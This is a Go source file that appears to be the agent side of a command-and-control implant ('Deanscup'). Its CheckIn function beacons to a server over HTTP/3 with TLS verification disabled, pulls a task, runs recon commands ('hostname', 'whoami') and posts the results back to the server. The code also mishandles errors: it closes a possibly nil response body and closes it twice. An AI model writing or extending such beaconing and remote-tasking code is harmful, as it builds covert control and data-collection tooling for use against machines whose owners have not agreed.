package includes

import (
	commands2 "Deanscup/client/includes/commands"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/quic-go/quic-go/http3"
	"io"
	"net/http"
	"strings"
)

type CheckInResponses struct {
	ID   string `json:"ID"`
	Task string `json:"task"`
}

type ResponseReply struct {
	ID     string `json:"id"`
	Task   string `json:"task"`
	Output string `json:"output"`
}

func CheckIn(ip string, port string, agent_id string) bool {
	// putting the url together lol
	url := fmt.Sprintf("https://%s:%s/checkin/%s", ip, port, agent_id)

	// Ignore self-signed certificate
	client := &http.Client{
		Transport: &http3.RoundTripper{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	resp, err := client.Get(url)

	if err != nil {
		fmt.Printf("[-] Request failed: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read response body: %v\n", err)
		return false
	}
	response := CheckInResponses{}

	err = json.Unmarshal(body, &response)
	if err != nil {
		fmt.Printf("[-] Failed to parse JSON: %v\n", err)
		return false
	}

	fmt.Printf("[+] Agent ID: %s\n", response.ID)
	fmt.Printf("[+] Task: %s\n", response.Task)

	commands := map[string]func([]string) string{
		"hostname": func(args []string) string { return commands2.Hostname() },
		"whoami":   func(args []string) string { return commands2.Whoami() },
	}

	var cmd_response string
	if len(response.Task) > 0 {
		taskParts := strings.Fields(response.Task)
		if len(taskParts) == 0 {
			// The task is an empty string
			return true
		}

		cmdName := strings.ToLower(taskParts[0])
		cmdArgs := taskParts[1:]

		// Look up the command in the map
		if cmdFunc, found := commands[cmdName]; found {
			cmd_response = cmdFunc(cmdArgs)
		} else {
			fmt.Printf("[-] Unknown command: %s\n", cmdName)
			cmd_response = "[-] Unknown command"
		}
	}
	newUrl := fmt.Sprintf("https://%s:%s/response/%s", ip, port, agent_id)
	if cmd_response != "" {

		responseReply := ResponseReply{
			ID:     response.ID,
			Task:   response.Task,
			Output: cmd_response,
		}

		jsonValue, err := json.Marshal(responseReply)
		if err != nil {
			fmt.Printf("[-] Failed to marshal JSON: %v\n", err)
			return false
		}

		// Properly send the request and handle errors
		resp, err := client.Post(newUrl, "application/json", strings.NewReader(string(jsonValue)))
		if err != nil {
			fmt.Printf("[-] Failed to send response: %v\n", err)
			return false
		}
		defer resp.Body.Close()

	}
	defer resp.Body.Close()
	return true
}
